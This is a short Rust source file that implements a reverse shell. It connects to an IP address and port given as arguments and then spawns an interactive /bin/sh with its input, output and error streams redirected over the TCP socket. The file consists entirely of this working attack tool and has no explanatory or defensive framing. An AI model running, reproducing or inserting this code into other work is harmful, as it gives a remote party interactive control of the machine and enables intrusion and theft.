use std::env;
use std::fs::File;
use std::net::TcpStream;
use std::os::unix::io::{FromRawFd, RawFd};
use std::os::unix::prelude::AsRawFd;
use std::process::Command;

fn main() {
    let args: Vec<String> = env::args().collect();
    let ip = &args[1];
    let port = &args[2];

    let tcp_stream = TcpStream::connect(format!("{ip}:{port}")).unwrap();
    let raw_fd: RawFd = tcp_stream.as_raw_fd();

    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { File::from_raw_fd(raw_fd) })
        .stdout(unsafe { File::from_raw_fd(raw_fd) })
        .stderr(unsafe { File::from_raw_fd(raw_fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
